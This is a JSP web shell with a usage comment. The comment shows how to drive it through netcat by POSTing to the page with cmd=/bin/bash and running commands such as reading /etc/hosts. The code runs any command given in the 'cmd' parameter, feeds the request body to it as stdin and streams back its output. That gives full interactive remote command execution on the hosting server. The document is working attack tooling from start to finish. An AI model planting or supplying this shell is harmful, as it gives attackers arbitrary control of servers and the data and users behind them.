<!-- 
If you use this from netcat, generate a POST request, and the POST data will be the stdin for the 
started command.
NOTE: it can be interactive! :) (Just set an overlong Content-Length, and hit CTRL+D when you're done)
Otherwise, you can still use a simple GET

$> nc 127.0.0.1 8080
POST /cmd-interactive.jsp?cmd=/bin/bash HTTP/1.0     <== start an interactive shell
Host: 127.0.0.1
Content-Length: 99999                                <== set this to a big-enough amount

cat /etc/hosts                                       <== first command
127.0.0.1	localhost
::1             localhost
date                                                 <== second command
Fri Oct 17 00:45:33 CEST 2014

-->
<%@ page import="java.io.*,java.util.*" %><%!
public String readFrom(BufferedReader in) throws Exception {
	StringBuilder sb = new StringBuilder();
	while(in.ready()){
		try{
			int c = in.read();
			if(c == -1)
				throw new Exception();
			sb.append((char)c);
		}catch(Exception e){
			throw new Exception(sb.toString());
		}
	}
	return sb.toString();
} %><%
out.flush();
String cmd = request.getParameter("cmd");
if ( cmd != null) {
	Process proc = Runtime.getRuntime().exec(cmd);
	BufferedReader stdout = new BufferedReader(new InputStreamReader(proc.getInputStream()));
	BufferedReader stderr = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
	BufferedReader reqin = new BufferedReader(new InputStreamReader(request.getInputStream()));
	OutputStream stdin = proc.getOutputStream();
	boolean stdout_end = false;
	boolean stderr_end = false;
	boolean stdin_end = false;
	boolean process_end = false;
	while( !(stdout_end && stderr_end && process_end) ){
		/*out.println("stdin_end="+stdin_end);
		out.println("stdout_end="+stdout_end);
		out.println("stderr_end="+stderr_end);
		out.println("process_end="+process_end);
		out.flush();*/
		try{
			proc.exitValue();
			process_end = true;
		}catch(Exception e){
			// Do nothing
		}
		boolean read = false;
		String string;
		if(!stdout_end){
			try{
				string = readFrom(stdout);
			}catch(Exception e){
				string = e.getMessage();
				stdout_end = true;
			}
			if( string.length() > 0 ){
				read = true;
				out.print(string);
			}
		}
		if(!stderr_end){
			try{
				string = readFrom(stderr);
			}catch(Exception e){
				string = e.getMessage();
				stderr_end = true;
			}
			if( string.length() > 0 ){
				read = true;
				out.print("STDERR: "+string);
			}
		}
		if(!stdin_end){
			try{
				string = readFrom(reqin);
			}catch(Exception e){
				string = e.getMessage();
				stdin_end = true;
				proc.destroy();
				stdout_end = true;
				stderr_end = true;
			}
			if( string.length() > 0 ){
				stdin.write( string.getBytes() );
				stdin.flush();
			}
		}
		if(read){
			out.flush();
		}else if(process_end){
			stdin_end = true;
			stdout_end = true;
			stderr_end = true;
		}else{
			Thread.sleep(100);
		}
	}
	reqin.close();
	out.close();
} %>
